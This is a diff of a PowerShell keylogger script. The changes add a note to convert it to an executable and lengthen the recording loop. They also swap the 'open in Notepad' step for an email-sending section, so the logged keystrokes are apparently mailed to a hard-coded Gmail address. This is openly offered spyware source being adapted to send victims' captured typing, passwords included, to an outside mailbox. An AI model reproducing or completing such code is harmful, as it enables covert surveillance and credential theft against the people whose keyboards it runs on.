@@ -1,3 +1,6 @@
+######################################################################
+## after you modify the information below then convert it to exe file#
+######################################################################
 
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
@@ -23,11 +26,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   {
     Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
 
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
-
+   #please specify time and default is 20 seconds
     $time = 0
-    while($time -lt 600) {
+    while($time -lt 1200) {
 
     $time
     $time++
@@ -66,7 +67,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
   finally
   {
-    # open logger file in Notepad
+    # please specify your email info
 
     $data = Get-Content "$Path" 
     $emailto = 'canarerobertjohn@gmail.com'
